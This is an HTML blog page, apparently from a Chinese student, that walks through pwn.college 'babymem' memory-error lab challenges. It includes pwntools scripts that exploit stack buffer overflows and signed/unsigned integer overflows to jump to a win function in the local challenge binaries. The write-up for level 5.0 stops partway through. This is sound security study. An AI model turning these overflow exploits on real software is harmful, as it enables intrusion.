@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      MemoryErrors - Rin
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="../../../../style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level1-0"><span class="toc-text">Level1.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level1-1"><span class="toc-text">Level1.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level2-0"><span class="toc-text">Level2..0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level2-1"><span class="toc-text">level2.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level3-0"><span class="toc-text">Level3.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level3-1"><span class="toc-text">Level3.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level4-0"><span class="toc-text">Level4.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level4-1"><span class="toc-text">Level4.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level5-0"><span class="toc-text">Level5.0</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="../../../../index.html" class="">
+          Home
+        </a>
+        
+        <a href="../../../../friends" class="">
+          Friends
+        </a>
+        
+        <a href="../../../../about" class="">
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author"></div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author"></div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="../../../../index.html" class="">
+            Home
+          </a>
+          
+          <a href="../../../../friends" class="">
+            Friends
+          </a>
+          
+          <a href="../../../../about" class="">
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">MemoryErrors</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2022/03/03</span>
+        </span>
+
+        
+
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/pwncollege">pwncollege</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>
+<pre><code class="bash">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors
+</code></pre>
+<h4 id="Level1-0">Level1.0<a class="post-anchor" href="#Level1-0"></a></h4><p>​        随便溢，覆盖掉变量就行。</p>
+<h4 id="Level1-1">Level1.1<a class="post-anchor" href="#Level1-1"></a></h4><p>​        随便溢。</p>
+<h4 id="Level2-0">Level2..0<a class="post-anchor" href="#Level2-0"></a></h4><p>​        随便溢。</p>
+<h4 id="level2-1">level2.1<a class="post-anchor" href="#level2-1"></a></h4><p>​        这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。</p>
+<p>​        关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。</p>
+<h4 id="Level3-0">Level3.0<a class="post-anchor" href="#Level3-0"></a></h4><p>​        没啥好说的。</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level3.0")
+
+win_addr = 0x4019fa
+payload = "a"*152 + p64(win_addr)
+
+p.recvuntil("Payload size:")
+p.sendline("160")
+p.recvuntil("!")
+p.sendline(payload)
+p.recv()
+
+p.interactive()
+</code></pre>
+<p>​        </p>
+<h4 id="Level3-1">Level3.1<a class="post-anchor" href="#Level3-1"></a></h4><pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+#p = process("./babymem_level3.1")
+p = process("/challenge/babymem_level3.1")
+
+
+win_addr = 0x401D35
+payload = b"a"*105 + p64(win_addr)
+
+
+p.send(b"115")
+#gdb.attach(p)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​            </p>
+<p>为什么偏移量这么难找。</p>
+<h4 id="Level4-0">Level4.0<a class="post-anchor" href="#Level4-0"></a></h4><p>​        这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。</p>
+<p>​        注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png" data-caption="截屏2022-03-05 上午10.16.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png" alt="截屏2022-03-05 上午10.16.03"></a></p>
+<p>对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。</p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+#p = process("./babymem_level4.0")
+p = process("/challenge/babymem_level4.0")
+
+#pad = 0x401B5 #0x30
+win_addr = 0x401B88
+payload = b"a"*40+ p64(win_addr)
+
+
+p.sendline(b"-999")
+
+#gdb.attach(p)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​        </p>
+<h4 id="Level4-1">Level4.1<a class="post-anchor" href="#Level4-1"></a></h4><p>​        漏洞点：</p>
+<pre><code class="c">if ( (signed int)v5 &gt; 30 )
+</code></pre>
+<p>​        依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。</p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+#p = process("./babymem_level4.1")
+p = process("/challenge/babymem_level4.1")
+
+#pad = 0x401B5 #0x30
+win_addr = 0x4016A3
+payload = b"a"*56+ p64(win_addr)
+
+
+p.sendline(b"-999")
+#gdb.attach(p)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h4 id="Level5-0">Level5.0<a class="post-anchor" href="#Level5-0"></a></h4><p>​        研究了一天的pwndocker的bug….所以说不管在哪里美丽和优雅都是有代价的。</p>
+<p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>
+<pre><code class="c">if ( v31 * v32 &gt; 7 )
+    sub_401150("record_size * record_num &lt; (unsigned int) sizeof(input)", "&lt;stdin&gt;", 143LL, "challenge");
+</code></pre>
+<p>​        并且这里并不能再构造负数了。</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="../pwncollege_ProgramMisuse/">ProgramMisuse</a>
+        
+    </div>
+  </div>
+
+  
+
+
+  <div id="comment"></div>
+
+  
+  <!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/night-owl.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+</article>
+        <footer>
+          <div class="copyright">
+            ©2022
+            <a href="https://fuurinko.github.io">Rin777</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script>  
